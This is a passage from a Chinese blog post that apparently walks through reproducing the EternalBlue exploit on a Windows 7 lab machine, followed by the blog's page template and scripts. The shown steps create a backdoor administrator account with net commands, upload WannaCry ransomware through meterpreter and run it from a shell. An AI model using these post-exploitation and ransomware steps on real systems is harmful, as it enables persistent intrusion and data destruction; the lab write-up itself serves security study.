+<p>靶机桌面出现hello.txt<br><img src="https://img-blog.csdnimg.cn/20210309204807579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>5.添加用户到管理员组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\system32&gt;net user atkx 123456 /add       <br><span class="hljs-comment">#在windows 7上创建一个hack的用户，以便下次访问</span><br><br>C:\Windows\system32&gt;net localgroup administrators atkx /add    <br><span class="hljs-comment">#将hack加入到windows 7的本地管理员组中，以便获得更大权限</span><br><br>C:\Windows\system32&gt;net user        <br><span class="hljs-comment">#查看windows 7本地用户</span><br><br>C:\Windows\system32&gt;net localgroup administrators       <br><span class="hljs-comment">#查看windows 7本地管理员</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210322115653954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>6.上传WannaCry勒索病毒</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /tmp/wcry.exe_ c://<br>[*] uploading  : /tmp/wcry.exe_ -&gt; c://<br>[*] uploaded   : /tmp/wcry.exe_ -&gt; c://\wcry.exe_<br></code></pre></td></tr></table></figure>
+<p>进入shell权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 368 created.<br>Channel 2 created.<br>Microsoft Windows [�汾 6.1.7601]<br>��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����<br></code></pre></td></tr></table></figure>
+<p>运行病毒</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\system32&gt;c://wcry.exe_<br>c://wcry.exe_<br></code></pre></td></tr></table></figure>
+<p>成功<br><img src="https://img-blog.csdnimg.cn/20210311193421574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/">#永恒之蓝</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>永恒之蓝漏洞复现</div>
+      <div>https://atkxor.github.io/posts/4260011972/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Atkx</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年3月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/3907386982/" title="深入学习HTTP协议">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">深入学习HTTP协议</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/93176463/" title="浅谈PHP反序列化漏洞">
+                        <span class="hidden-mobile">浅谈PHP反序列化漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<!-- script type="text/javascript" src="/js/love.js"></script-->
+
+<!-- 鼠标点击烟花爆炸效果-->
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
